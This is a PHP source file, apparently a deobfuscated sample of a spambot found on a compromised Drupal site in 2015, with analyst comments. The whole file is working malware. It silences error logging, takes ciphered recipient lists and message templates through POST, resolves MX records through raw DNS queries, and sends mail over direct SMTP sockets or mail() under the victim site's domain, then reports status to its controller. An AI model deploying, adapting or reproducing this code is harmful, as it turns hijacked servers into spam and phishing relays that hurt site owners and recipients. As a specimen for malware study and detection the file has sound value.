<?php  

/*
* Description: Spambot found on corrupted drupal installation
* Seen: Jun 26 2015
*/

@error_reporting(NULL);
@ini_set('error_log' ,NULL);
@ini_set('log_errors',0);

define('DNS_TYPE_MX', 0x000F);
define('DNS_TYPE_A', 0x0001);
define('DNS_TYPE_NS', 0x0002);
define('DNS_STEP_QESTION', 1);
define('DNS_STEP_ANSWER', 2);
define('DNS_STEP_AUTHORITY', 3);
define('DNS_STEP_ADDITIONAL', 4);
define('SOCKET_TYPE_SOCKET', 1);
define('SOCKET_TYPE_FSOCKET', 2);
define('SOCKET_TYPE_STREAM' , 4);
define('SOCKET_TYPE_NO', 5);
define('SOCKET_PROTO_TCP', 1);
define('SOCKET_PROTO_UDP', 2);
define('STEP_CONNECT', 0);
define('STEP_CONNECTED', 1);
define('STEP_EHLO', 2);
define('STEP_MAILFROM' , 3);
define('STEP_RCPTTO', 4);
define('STEP_DATA', 5);
define('STEP_BODY', 6);
define('STEP_QUIT', 7);
define('STEP_COMPLETED', 8);

set_socket_type();

$email_array = array(
    'toList' => "", 
    'fromLogin' => "",
    'fromName' => "", 
    'subjTempl' => "", 
    'bodyTempl' => "", 
    'hostFrom' => ""
);

// We try to parse POST data to fill email_array variable.
if (FALSE == init_mail_array($email_array)) {
    // If data are not correct
    echo PHP_OS.'+'.md5(0987654321)."+01+[[]]\n";
    exit;
}

$targets = array();

// For each email in the destination list.
for ($i = 0; $i < count($email_array['toList']); $i++) {
    $target_info = array( 
        'id' => $i,
        'g_mailto' => "",
        'g_mailto+' => "",
        'g_mailfrom' => "",
        'g_mailfrom+' => "",
        'g_domainto' => "",
        'g_domainfrom' => "",
        'g_namefirst' => "",
        'g_namelast' => "",
        'g_body' => "",
        'g_subject' => "",
        'g_fff' => FALSE,
        'g_header' => "",
        'g_headerfrom' => "",
        's_header' => "",
        's_mxhost' => "",
        's_mxaddr' => FALSE,
        's_sock' => FALSE,
        's_time' => time(),
        's_step' => constant('STEP_CONNECT'),
        's_port' => 25,
        's_datain' => "",
        's_dataout' => "",
        's_trig' => FALSE,
        'l_err' => "",
        'l_done' => FALSE,
        'l_way' => 0,
        'l_failsmtp' => FALSE,
        'l_smtp_end' => FALSE,
    );

    // We try to fill target_info array for the given email
    if (FALSE == prepare_email($email_array['toList'][$i], $email_array, $target_info)) {
        // If something is wrong
        echo PHP_OS.'+'.md5(1111111111).'+02+[['.encode_b64($email_array['toList'][$i])."]]\n";
        continue;
    }

    $targets[] = $target_info;
}


// We first try to send mails via socket
send_via_sockets($targets);

// We try to send email via php mail function if errors occurs previously
send_via_mail($targets);

// We log the result of the mailing
log_results($targets);

exit;


/*
* Functions part
*/


function log_results($targets) {
    $i = 0;
    $sending_method = "";
    
    for ($i = 0; $i < count($targets); $i++) {
    
        // If mail was not correctly sended
        if ($targets[$i]['l_failsmtp'] == TRUE) {
            echo PHP_OS.'+'.md5(2222222222).'04+[['.encode_b64($targets[$i]['g_mailto'].' :: '.$targets[$i]['l_err'])."]]\n";
        }
        
        // If email was correctly sended
        if ($targets[$i]['l_done'] == TRUE) {
            $sending_method .= $targets[$i]['l_way'];
            $i++;
        }
    }
    
    if ($i == 0) {
        // If mailing totally failed
        echo PHP_OS.'+'.md5(0987654321)."+04+[[]]\n";
    } else {
        // If mailing was at least partially ok
        echo 'OK+'.md5(1234567890).'+'.$i.'+'.count($targets)."[]\n";
    }
}


function send_via_mail(&$targets) {
    // If mail function is not available, we stop.
    if (!function_exists('mail')) {
        return FALSE;
    }

    for ($i = 0; $i < count($targets); $i++) {
         //If email already sent, we skip it.
        if ($targets[$i]['l_done'] == TRUE) {
            continue;
        }
  
        if ($targets[$i]['g_fff']) {
            if (@mail($targets[$i]['g_mailto+'], $targets[$i]['g_subject'], $targets[$i]['g_body'], $targets[$i]['g_headerfrom'].$targets[$i]['g_header'], '-f'.$targets[$i]['g_mailfrom'])) {
                $targets[$i]['l_done'] = TRUE;
                $targets[$i]['l_way'] = 2;
            } else {
                $targets[$i]['l_done'] = FALSE;
            }
        } else {
            if (@mail($targets[$i]['g_mailto+'], $targets[$i]['g_subject'], $targets[$i]['g_body'], $targets[$i]['g_header'])) {
                $targets[$i]['l_done'] = TRUE;
                $targets[$i]['l_way'] = 2; 
            } else {
                $targets[$i]['l_done'] = FALSE;
            } 
        } 
    } 
}

function send_via_sockets(&$targets) {
    while (poll_sockets($targets)) {
        handle_smtp($targets);
        // We sleep for 25ms.
        usleep(25000); 
    } 
}


function set_target_error(&$targets, $id, $data, $doyaq76) {
    if ($targets[$id]['s_sock'] != FALSE) {
        close_socket($targets[$id]['s_sock']);
    }

    $targets[$id]['l_err'] = '['.$targets[$id]['s_step'].']'.trim(preg_replace('/\r\n/', ' ', $data));
    $targets[$id]['l_failsmtp'] = $doyaq76;
    $targets[$id]['l_smtp_end'] = TRUE;
    return; 
}

function handle_smtp(&$targets) {
    $now = time();
    foreach($targets as $id=>$target_info) {
        if ($target_info['l_smtp_end'] == TRUE) {
            continue;
        }

        if ($target_info['s_time'] + 20 < $now) {
            if ($targets[$id]['s_step'] == constant('STEP_CONNECT') && $targets[$id]['s_port'] != 587) {
                close_socket($targets[$id]['s_sock']);
                $targets[$id]['s_port'] = 587;
                $targets[$id]['s_time'] = time();
                continue; 
            }
            set_target_error($targets, $id, 'timeout', FALSE);
            continue;
        }

        switch($targets[$id]['s_step']) {
        
            case constant('STEP_CONNECT'): 
                if ($targets[$id]['s_mxaddr'] == FALSE) {
                    $targets[$id]['s_mxaddr'] = @gethostbyname($targets[$id]['s_mxhost']);
                    if (!@preg_match('/([0-9]{1,3}\.?){4}/', $targets[$id]['s_mxaddr'])) {
                        set_target_error($targets, $id, 'resolve mx', FALSE);
                        break; 
                    } 
                }
                
                $errno = 0;
                $error = '';
                $targets[$id]['s_sock'] = init_socket($targets[$id]['s_sock'], constant('SOCKET_PROTO_TCP'), $targets[$id]['s_mxaddr'], $targets[$id]['s_port'], 2, $errno, $error, TRUE);
                if ($targets[$id]['s_sock'] == FALSE) {
                    break;
                }

                if ($errno == 0 || $errno === 56 || $errno === 10056 ) {
                    $targets[$id]['s_step'] = constant('STEP_CONNECTED');
                    set_timeout($targets[$id]['s_sock'], 15);
                    $targets[$id]['s_time'] = time(); 
                }
                break;
                
            case constant('STEP_CONNECTED'): 
                if (set_s_datain($targets, $id)) {
                    $targets[$id]['s_datain'] = "";
                    $targets[$id]['s_dataout'] =   'EHLO '.$targets[$id]['g_domainfrom']."\r\n";
                    $targets[$id]['s_step'] = constant('STEP_EHLO');
                    $targets[$id]['s_time'] = time(); 
                }
                break;
                
            case constant('STEP_EHLO'): 
                if (set_s_dataout($targets, $id)) {
                    if (set_s_datain($targets, $id)) {
                        if (substr($targets[$id]['s_datain'], 0, 3) != 250) {
                            set_target_error($targets, $id, $targets[$id]['s_datain'], TRUE);
                            break; 
                        }
                        
                        $targets[$id]['s_datain'] = "";
                        $targets[$id]['s_dataout'] =   'MAIL FROM:<'.$targets[$id]['g_mailfrom'].">\r\n";
                        $targets[$id]['s_step'] = constant('STEP_MAILFROM');
                        $targets[$id]['s_time'] = time(); 
                    }
                    break; 
                }
                break;
                
            case constant('STEP_MAILFROM'): 
                if (set_s_dataout($targets, $id)) {
                    if (set_s_datain($targets, $id)) {
                        if (substr($targets[$id]['s_datain'], 0, 3) != 250) {
                            set_target_error($targets, $id, $targets[$id]['s_datain'], TRUE);
                            break;
                        }
                        $targets[$id]['s_datain'] = "";
                        $targets[$id]['s_dataout'] = 'RCPT TO:<'.$targets[$id]['g_mailto'].">\r\n";
                        $targets[$id]['s_step'] = constant('STEP_RCPTTO');
                        $targets[$id]['s_time'] = time();
                    }
                    break; 
                }
                break;
            case constant('STEP_RCPTTO'): 
                if (set_s_dataout($targets, $id)) {
                    if (set_s_datain($targets, $id)) {
                        if (substr($targets[$id]['s_datain'], 0, 3) != 250 && substr($targets[$id]['s_datain'], 0, 3) != 251) {
                            set_target_error($targets, $id, $targets[$id]['s_datain'], TRUE);
                            break;
                        }
                        $targets[$id]['s_datain'] = "";
                        $targets[$id]['s_dataout'] = "DATA\r\n";
                        $targets[$id]['s_step'] = constant('STEP_DATA');
                        $targets[$id]['s_time'] = time(); 
                    }
                    break;
                }
                break;
            case constant('STEP_DATA'): 
                if  (set_s_dataout($targets, $id)) {
                    if (set_s_datain($targets, $id)) {
                        if (substr($targets[$id]['s_datain'], 0, 3) != 354) {
                            set_target_error($targets, $id, $targets[$id]['s_datain'], TRUE);
                            break;
                        }
                        $targets[$id]['s_datain'] = "";
                        $targets[$id]['s_dataout'] = $targets[$id]['s_header']."\r\n".$targets[$id]['g_body']."\r\n.\r\n";
                        $targets[$id]['s_step'] = constant('STEP_BODY');
                        $targets[$id]['s_time'] = time(); 
                    }
                    break;
                }
                break;
            case constant('STEP_BODY'): 
                if (set_s_dataout($targets, $id)) {
                    if (set_s_datain($targets, $id)) {
                        if (substr($targets[$id]['s_datain'], 0, 3) != 250) {
                            set_target_error($targets, $id, $targets[$id]['s_datain'], TRUE);
                            break;
                        }
                        
                        $targets[$id]['s_datain'] = "";
                        $targets[$id]['s_dataout'] = 'QUIT'."\r\n";
                        $targets[$id]['s_step'] = constant('STEP_QUIT');
                        $targets[$id]['s_time'] = time();
                        $targets[$id]['l_done'] = TRUE;
                        $targets[$id]['l_way'] = 1;
                    }
                    break; 
                }
                break;
            
            case constant('STEP_QUIT'): 
                if (set_s_dataout($targets, $id)) {
                    set_target_error($targets, $id, "", FALSE);
                }
                break;
        } 
    }
}

function set_s_datain(&$targets, $id) {
    $errno = 0;
    $error = "";
    if ($targets[$id]['s_trig'] == FALSE) {
        if (strlen($targets[$id]['s_datain']) != 0) {
            return TRUE;
        }
        return FALSE;
    }

    $read_ret = read_socket($targets[$id]['s_sock'], 4086, $errno, $error);
    if ($read_ret == FALSE || $read_ret == "") {
        if ($errno != 35 && $errno != 10035 && $errno!= 11 && $errno!= 10060) {
            set_target_error($targets, $id, $error, FALSE);
            return FALSE;
        }
        
        if (strlen($targets[$id]['s_datain']) != 0) {
            return TRUE;
        }
    
        return FALSE;
    }

    $targets[$id]['s_datain'] = $read_ret;
    return FALSE;
}


function set_s_dataout(&$targets, $id) {
    $errno = 0;
    $error = "";
    if (strlen($targets[$id]['s_dataout']) == 0) {
        return TRUE;
    }

    $write_ret = write_in_socket($targets[$id]['s_sock'], $targets[$id]['s_dataout'], $errno, $error);
    if ($write_ret == FALSE) {
        if ($errno != 35 && $errno != 10035 && $errno != 11 && $errno != 10060) {
            set_target_error($targets, $id, $error, FALSE);
        }
        return FALSE;
    }
    $targets[$id]['s_dataout'] = substr($targets[$id]['s_dataout'], $write_ret);
    if (strlen($targets[$id]['s_dataout']) == 0) {
        return TRUE; 
    }
    return FALSE; 
}


function poll_sockets(&$targets) {
    $error = FALSE;
    if (constant('SOCKET_TYPE') != constant('SOCKET_TYPE_SOCKET')) {
        foreach(array_keys($targets) as $target) {
            if ($targets[$id]['l_smtp_end'] != TRUE) {
                $targets[$id]['s_trig'] = TRUE;
                $error = TRUE;
            }
        }
        return $error;
    }

    $s_read = array();
    foreach(array_keys($targets) as $id) {
        if ($targets[$id]['l_smtp_end'] != TRUE) {
            if ($targets[$id]['s_sock'] == 0 || $targets[$id]['s_step'] == constant('STEP_CONNECT')) {
                $targets[$id]['s_trig'] = TRUE;
            } else {
                $targets[$id]['s_trig'] = FALSE;
                $s_read[]= $targets[$id]['s_sock'];
            }
            $error = TRUE;
        }
    }

    if (count($s_read) == 0) {
        return $error;
    }
    
    $sock_ret = @socket_select($s_read, $s_write = NULL, $s_except = NULL, 0);
    
     //If there is an error or no socket available
    if ($sock_ret == FALSE || $sock_ret == 0) {
        return $error;
    }

    foreach(array_keys($targets) as $id) {
        $targets[$id]['s_trig'] = FALSE;
        foreach($s_read as $socket) {
            if ($targets[$id]['s_sock'] == $socket) {
                $targets[$id]['s_trig'] = TRUE;
                break;
            }
        }
    }
    return $error;
}


function set_socket_type() {
    if (function_exists('socket_create') && function_exists('socket_connect') && function_exists('socket_read') && function_exists('socket_write')) {
        define('SOCKET_TYPE', constant('SOCKET_TYPE_SOCKET'));
        return TRUE; 
    }

    if (function_exists('fsockopen')) {
        define('SOCKET_TYPE', constant('SOCKET_TYPE_FSOCKET'));
        return TRUE;
    }
    
    if (function_exists('stream_socket_client')) {
        define('SOCKET_TYPE', constant('SOCKET_TYPE_STREAM'));
        return TRUE;
    }

    define('SOCKET_TYPE', constant('SOCKET_TYPE_NO'));
    return FALSE; 
}

function prepare_email($target_email, $email_array, &$target_info) {
    $matches = array();
    if (FALSE === @preg_match('/(.*?;)?(.*?;)?(.+@(.+)?);?/', $target_email, $matches) ) {
        return FALSE;
    }

    if (!isset($matches) || count($matches) != 5) {
        return FALSE;
    }

    $target_info['g_namefirst'] = @ucfirst(str_replace(';',"",$matches[1]));
    $target_info['g_namelast'] = @ucfirst(str_replace(';',"",$matches[2]));
    $target_info['g_mailto'] = str_replace(';',"",$matches[3]);
    $target_info['g_domainto'] = str_replace(';',"",$matches[4]);
    
    if (!isset($target_info['g_mailto']) || $target_info['g_mailto'] == "") {
        return FALSE;
    }

    if (!isset($target_info['g_domainto']) || $target_info['g_domainto'] == "") {
        return FALSE;
    }

    if (isset($target_info['g_namefirst']) && $target_info['g_namefirst'] != "") {
        $target_info['g_mailto+'] = '"'.$target_info['g_namefirst'].' '.$target_info['g_namelast'].'" <'.$target_info['g_mailto'].'>';
    } else {
        $target_info['g_mailto+'] = $target_info['g_mailto'];
    }

    $target_info['g_domainfrom'] = $email_array['hostFrom'];
    if (preg_match('/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/', $email_array['hostFrom']) || @ini_get('safe_mode')) {
        $target_info['g_fff'] = FALSE;
    } else {
        $target_info['g_fff'] = TRUE;
    }

    $target_info['g_mailfrom'] = $email_array['fromLogin'].'@'.$email_array['hostFrom'];
    if (isset($email_array['fromName']) && $email_array['fromName'] != "") {
        $target_info['g_mailfrom+'] = $email_array['fromName'].' <'.$target_info['g_mailfrom'].'>';
    } else {
        $target_info['g_mailfrom+'] = $target_info['g_mailfrom'];
    }

    $target_info['s_mxhost'] = get_mx($target_info['g_domainto']);
    $target_info['g_subject'] = @str_replace('%R_NAME%', $target_info['g_namefirst'], $email_array['subjTempl']);
    $target_info['g_subject'] = @str_replace('%R_LNAME%', $target_info['g_namelast'],  $target_info['g_subject']);
 
    $target_info['g_body'] = @str_replace('%R_NAME%', $target_info['g_namefirst'], $email_array['bodyTempl']);
    $target_info['g_body'] = @str_replace('%R_LNAME%', $target_info['g_namelast'], $target_info['g_body']);
    $target_info['g_body'] = @str_replace('%MAIL_EN%', encode_b64($target_info['g_mailto']), $target_info['g_body']);
 
    $target_info['g_header'] = 'X-Priority: 3 (Normal)'."\r\n";
    $target_info['g_header'] .= 'MIME-Version: 1.0'."\r\n";
    $target_info['g_header'] .= 'Content-Type: text/html; charset="iso-8859-1"'."\r\n";
    $target_info['g_header'] .= 'Content-Transfer-Encoding: 8bit'."\r\n";
 
    $target_info['g_headerfrom'] = 'From: '.$target_info['g_mailfrom+']."\r\n";
    $target_info['g_headerfrom'] .= 'Reply-To:'.$target_info['g_mailfrom+']."\r\n";
 
    $target_info['s_header'] = 'Date: '.@date('D, j M Y G:i:s O')."\r\n";
    $target_info['s_header'] .= $target_info['g_headerfrom'];
    $target_info['s_header'] .= 'Message-ID: <'.preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time())).'@'.$email_array['hostFrom'].">\r\n";
    $target_info['s_header'] .= 'To: '.$target_info['g_mailto+']."\r\n";
    $target_info['s_header'] .= 'Subject: '.$target_info['g_subject']."\r\n";
    $target_info['s_header'] .= $target_info['g_header'];
    
    return TRUE;
}


function get_mx($domain) {
    $mxhosts = array();
    $weight = array();
    if (function_exists('getmxrr')) {
        @getmxrr($domain, $mxhosts, $weight);
    } else {
        if (constant('SOCKET_TYPE') == constant('SOCKET_TYPE_NO')) {
            return FALSE;
        }
        $wzlix23 = get_dns_infos($domain, constant('DNS_TYPE_MX'));
        if ($wzlix23 == FALSE || !isset($wzlix23['ans'])) {
            return FALSE;
        }

        foreach ($wzlix23['ans'] as $ugagf46) {
            if ($ugagf46['type'] == constant('DNS_TYPE_MX')) {
                $mxhosts[] = $ugagf46['data'];
                $weight[] = $ugagf46['preference']; 
            }
        }
    }

    if (count($mxhosts) == 0) {
        return FALSE;
    }

    $i = array_keys($weight, min($weight));
    return $mxhosts[$i[0]];
}


function init_mail_array(&$email_array) {
    if (count($_POST) < 2) {
        return FALSE;
    }

    $isciphered = false;
    $list = $data = "";
    foreach (array_keys($_POST) as $key) {
        if ($key[0] == 'l') {
            $list = $key;
        }

        if ($key[0] == 'd') {
            $data = $key;
        }

        if ($key[0] == 'e') {
            $isciphered = true;
        }
    }

    if ($list == "" || $data == "") {
        return FALSE;
    }
 
    $clean_list = clean_post_value($list, $isciphered );
    $clean_data= clean_post_value($data, $isciphered);

    if ($clean_list == FALSE || $clean_data == FALSE) {
        return FALSE;
    }
 
    $email_array['toList'] = @preg_split('/#/', $clean_list);
    $email_array['fromLogin'] = $email_array['fromName'] = $email_array['subjTempl'] = $email_array['bodyTempl'] = "";
    
    $matches = array();
    
    if (FALSE !== @preg_match('/<USER>(.*?)<\/USER>/ism', $clean_data, $matches) && isset($matches) && count($matches) > 1) {
        $email_array['fromLogin'] = $matches[1];
    }
 
    if (FALSE !== @preg_match('/<NAME>(.*?)<\/NAME>/ism', $clean_data, $matches) && isset($matches) && count($matches) > 1) {
        $email_array['fromName'] = $matches[1];
    }

    if (FALSE !== @preg_match('/<SUBJ>(.*?)<\/SUBJ>/ism', $clean_data, $matches) && isset($matches) && count($matches) > 1) {
        $email_array['subjTempl'] = $matches[1];
    }

    if (FALSE !== @preg_match('/<SBODY>(.*?)<\/SBODY>/ism',$clean_data, $matches) && isset($matches) && count($matches) > 1) {
        $email_array['bodyTempl'] = $matches[1];
    }

    $email_array['hostFrom'] = @preg_replace('/^(www|ftp)\./i', '', $_SERVER['HTTP_HOST']);
    return TRUE;
}


function clean_post_value($key, $isciphered) {
    if (!isset($key) || $key == "") {
        return FALSE;
    }

    $value = @$_POST[$key];
    if ($isciphered) {
        $value = uncipher($value);
        for($i = 0; $i < strlen($value); $i++) {
            $value[$i]= chr(ord($value[$i]) ^ 2);
        }
    }
    return urldecode(stripslashes($value));
}


function uncipher($ciphered) {
    $result="";
    
    for($i=0; $i<256; $i++){
        $asciitable[$i]=chr($i);
    }

    $woayt44=array_flip(preg_split('//ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',-1,1));
    $matches = array();
    preg_match_all('([A-z0-9+\/]{1,4})', $ciphered, $matches);
    
    foreach($matches[0] as $block){
        $prev=0;
        
        for($i=0; isset($block[$i]); $i++){
            $prev=($prev<<6)+$woayt44[$block[$i]]; 
            if($i>0){
                $result.=$asciitable[$prev>>(4-(2*($i-1)))];
                $prev=$prev&(0xf>>(2*($i-1)));
            }
        }
    }
    return $result;
}


function encode_b64($email) {
    for($i = 0; $i < strlen($email); $i++) {
        $email[$i] = chr(ord($email[$i]) ^ 2);
    }
    return base64_encode($email);
}
 
 
function init_socket($socket, $protocol, $address, $port, $timeout, &$errno, &$error, $nonblock = false) {
    $proto_str = "";
    $proto_int = NULL;
    $proto_type = NULL;
    $errno = 0;
    $error = "";
    
    if ($protocol == constant('SOCKET_PROTO_TCP')) {
        $proto_str = 'tcp';
        $proto_int = SOL_TCP;
        $proto_type = SOCK_STREAM;
    } else if ($protocol == constant('SOCKET_PROTO_UDP')) {
        $proto_str = 'udp';
        $proto_int = SOL_UDP;
        $proto_type = SOCK_DGRAM;        
    } else {
        $error = 'Error: invalid protocol';
        return FALSE;
    }


    switch(constant('SOCKET_TYPE')) {
        case constant('SOCKET_TYPE_SOCKET'): 
            if ($socket == FALSE) {
                $socket = @socket_create(AF_INET, $proto_type, $proto_int);
                if ($socket == FALSE) {
                    $errno = socket_last_error();
                    $error = socket_strerror($errno);
                    break;
                }
                socket_set_option($socket , SOL_SOCKET, SO_REUSEADDR, 1);
                socket_set_option($socket , SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
                socket_set_option($socket , SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => 0));
                if ($nonblock) {
                    socket_set_nonblock($socket);
                }
            }
            
            if (!@socket_connect($socket, $address, $port)) {
                $errno = socket_last_error($socket);
                $error = socket_strerror($errno);
            }

            if ($nonblock) {
                socket_set_nonblock($socket);
            }
            break;
 
        case constant('SOCKET_TYPE_FSOCKET'): 
            $socket = @fsockopen($proto_str.'://'.$address, $port, $errno, $error, $timeout);
            if ($socket && $nonblock) {
                @stream_set_blocking($socket, 0);
            }
            @stream_set_timeout($socket, $timeout);
            break;
        
        case constant('SOCKET_TYPE_STREAM'): 
            $socket = @stream_socket_client($proto_str.'://'.$address.':'.$port, $errno, $error, $timeout);
            if ($socket && $nonblock) {
                @stream_set_blocking($socket, 0);
            }
            @stream_set_timeout($socket, $timeout);
            break;
            
        default: 
            $error = 'Error: invalid socket type';
            return FALSE; 
    }
    return $socket;
}


function close_socket(&$socket) {
    if ($socket == FALSE) {
        return;
    }

    if (constant('SOCKET_TYPE') == constant('SOCKET_TYPE_SOCKET')) {
        @socket_close($socket);
    } else {
        @fclose($socket);
    }

    $socket = FALSE;
    return;
}


function read_socket($socket, $mrbns89, &$errno, &$error) {
    if ($socket == FALSE) {
        return FALSE;
    }

    if (constant('SOCKET_TYPE') == constant('SOCKET_TYPE_SOCKET')) {
        $read_ret = @socket_read($socket, $mrbns89, PHP_BINARY_READ);
        if ($read_ret == FALSE) {
            $errno = socket_last_error($socket);
            $error = socket_strerror($errno);
        }
    } else {
        if (@feof($socket)) {
            return FALSE;
        }

        $read_ret = @fread($socket, $mrbns89);
        if (strlen($read_ret) == 0) {
            $errno = 35;
        }
    }
    return $read_ret;
}


function write_in_socket($socket, $data, &$errno, &$error) {
    if ($socket == FALSE) {
        return FALSE;
    }

    if (constant('SOCKET_TYPE') == constant('SOCKET_TYPE_SOCKET')) {
        $write_ret = @socket_write($socket, $data);
        if ($write_ret == FALSE) {
            $errno = socket_last_error($socket);
            $error = socket_strerror($errno);
        }
    } else {
        if (@feof($socket)) {
            return FALSE;
        }
        $write_ret = @fwrite($socket, $data);
    }
    return $write_ret;
}
 
 
function set_timeout($socket, $timeout) {
    if ($socket == FALSE) {
        return FALSE;
    }

    if (constant('SOCKET_TYPE') == constant('SOCKET_TYPE_SOCKET')) {
        @socket_set_option($socket , SOL_SOCKET, SO_RCVTIMEO, array('sec' => $timeout, 'usec' => 0));
        @socket_set_option($socket , SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => 0));
    } else {
        @stream_set_timeout($socket, $timeout);
    }
    return TRUE;
}


function get_dns_infos($domain, $type) {
    $errno = 0;
    $error = "";
    $socket = init_socket(FALSE, constant('SOCKET_PROTO_UDP'), '8.8.8.8', 53, 10, $errno, $error);
    if (!$socket) {
        return FALSE;
    }
    $clels79 = rand(0x0001, 0xFFFE);
    $owgby12 = explode('.', $domain);
    $uyafb15 = pack('nnnnnn', $clels79, 0x0100, 0x0001, 0x0000, 0x0000, 0x0000);
    foreach($owgby12 as $qblja54) {
        $uyafb15 .= pack('Ca*', strlen($qblja54), $qblja54);
    }

    $uyafb15.= pack('Cnn', 0x00, $type, 0x0001);
    $wzlix23 = write_in_socket($socket, $uyafb15, $errno, $error);
    if (!$wzlix23 || $wzlix23 != strlen($uyafb15)) {
        close_socket($socket);
        return FALSE;
    }

    $zfcav5 = read_socket($socket, 4086, $errno, $error);
    if ($zfcav5 == FALSE || strlen($zfcav5) < 12) {
        close_socket($socket);
        return FALSE;
    }

    $mpugn39 = unpack('ntid/nflags/nque/nans/nauth/nadd', substr($zfcav5, 0, 12));
    $syfkf90 = 12;
    $result = array('header' => $mpugn39);
    for ($i = constant('DNS_STEP_QESTION'); $i <= constant('DNS_STEP_ADDITIONAL'); $i++) {
        $mggto64 = '';

        switch ($i) {
            case constant('DNS_STEP_QESTION'): 
                $mggto64 = 'que';
                break;
            
            case constant('DNS_STEP_ANSWER'): 
                $mggto64 = 'ans';
                break;
 
            case constant('DNS_STEP_AUTHORITY'):
                $mggto64 = 'auth';
                break;

            case constant('DNS_STEP_ADDITIONAL'):
                $mggto64 = 'add';
                break;
        }

        for ($yfuds89 = 0; $yfuds89 < $mpugn39[$mggto64]; $yfuds89++) {
            $nqjtw27['name'] = jldeq95($syfkf90, $zfcav5);
            if ($i == constant('DNS_STEP_QESTION')) {
                $nqjtw27 = array_merge($nqjtw27, unpack('ntype/n'.'c'.'lass', substr($zfcav5, $syfkf90, 4)));
                $syfkf90+=4;
            } else {
                $nqjtw27 = array_merge($nqjtw27 , unpack('ntype/n'.'c'.'lass/Nttl/ndatalength', substr($zfcav5, $syfkf90, 10)));
                $syfkf90+=10;
                
                switch ($nqjtw27['type']) {
                    case constant('DNS_TYPE_MX'): 
                       $nqjtw27 = array_merge($nqjtw27, unpack('npreference', substr($zfcav5, $syfkf90, 2)));
                       $syfkf90+=2;
                       $nqjtw27['data'] = jldeq95($syfkf90, $zfcav5);
                       break;
 
                    case constant('DNS_TYPE_A'): 
                        $nqjtw27 = array_merge($nqjtw27, unpack('Ndata', substr($zfcav5, $syfkf90, 4)));
                        $syfkf90+=4;
                        $nqjtw27['i'.'p'] = long2ip($nqjtw27['data']);
                        break;
                    
                    case constant('DNS_TYPE_NS'): 
                        $nqjtw27['data'] = jldeq95($syfkf90, $zfcav5);
                        break;
 
                    default: 
                        $syfkf90 += $nqjtw27['datalength'];
                }
            }

            $result[$mggto64][] = $nqjtw27;
        }
    }
    return $result;
}


function jldeq95(&$ncmxz39, $zfcav5) {
    $result = "";
    $zfhgv16 = $ncmxz39;
    while (ord($zfcav5[$zfhgv16]) != 0) {
        if (ord($zfcav5[$zfhgv16]) == 0xC0) {
            if ($zfhgv16 >= $ncmxz39) {
                $ncmxz39 += 2;
            }
 
            $zfhgv16 = ord($zfcav5[$zfhgv16 + 1]);
            continue;
        }
 
        if (strlen($result) > 0) {
            $result .= '.';
        }
 
        $result .= substr($zfcav5, $zfhgv16 + 1, ord($zfcav5[$zfhgv16]));
        $zfhgv16 += ord($zfcav5[$zfhgv16]) + 1;
        if ($zfhgv16 > $ncmxz39) {
            $ncmxz39 = $zfhgv16;
        }
    }
 
    if ($zfhgv16 >= $ncmxz39) {
        $ncmxz39 += 1;
    }
 
    return $result;
}
 
